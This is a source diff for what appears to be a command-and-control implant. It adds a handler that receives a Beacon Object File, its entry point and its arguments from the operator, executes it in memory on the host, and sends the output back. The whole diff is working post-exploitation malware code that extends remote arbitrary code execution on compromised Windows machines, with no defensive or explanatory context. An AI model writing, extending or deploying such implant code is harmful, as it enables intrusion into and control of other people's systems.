@@ -1,4 +1,5 @@
 #include "Commander.h"
+#include "Boffer.h"
 
 Commander::Commander(Agent* a)
 {
@@ -36,6 +37,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_DOWNLOAD_STATE:
 			this->CmdDownloadState(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_EXEC_BOF:
+			this->CmdExecBof(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_JOBS_LIST:
 			this->CmdJobsList(CommandId, inPacker, outPacker); break;
@@ -263,6 +267,26 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(2);
 	}
+}
+
+void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG entrySize = 0;
+	BYTE* entry = inPacker->UnpackBytes(&entrySize);
+	ULONG bofSize  = 0;
+	BYTE* bof      = inPacker->UnpackBytes(&bofSize);
+	ULONG argsSize = 0;
+	BYTE* args     = inPacker->UnpackBytes(&argsSize);
+	ULONG taskId   = inPacker->Unpack32();
+
+	ULONG outputSize = 0;
+	CHAR* output = ObjectExecute((int*)&outputSize, (CHAR*)entry, bof, bofSize, args, argsSize);
+
+	outPacker->Pack32(taskId);
+	outPacker->Pack32(commandId);
+	outPacker->PackBytes((PBYTE)output, outputSize);
+
+	MemFreeLocal((LPVOID*)&output, outputSize);
 }
 
 void Commander::CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
